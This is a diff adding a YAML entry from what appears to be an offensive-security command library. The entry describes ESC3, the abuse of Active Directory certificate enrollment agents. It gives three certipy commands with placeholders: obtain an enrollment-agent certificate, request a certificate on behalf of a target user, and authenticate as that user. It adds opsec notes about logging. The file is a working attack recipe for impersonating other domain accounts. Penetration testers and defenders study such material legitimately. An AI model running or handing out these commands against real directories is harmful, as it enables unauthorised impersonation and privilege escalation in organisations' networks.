@@ -1,0 +1,16 @@
+name: ADCSESC3
+description: ESC3 - Certificate Request Agent abuse (enrollment on behalf of others)
+commands:
+- '# Step 1: Request Certificate Request Agent certificate'
+- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -target '<CA_HOST>' -template '<AGENT_TEMPLATE>'
+- ''
+- '# Step 2: Use agent cert to request certificate on behalf of target'
+- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -target '<CA_HOST>' -template '<TARGET_TEMPLATE>' -on-behalf-of '<TARGET_USER>' -pfx <AGENT>.pfx
+- ''
+- '# Step 3: Authenticate as target user'
+- certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>
+opsec:
+- Enrollment agent requests are logged
+- Requires two templates: agent template + target template
+references:
+- https://posts.specterops.io/certified-pre-owned-d95910965cd2
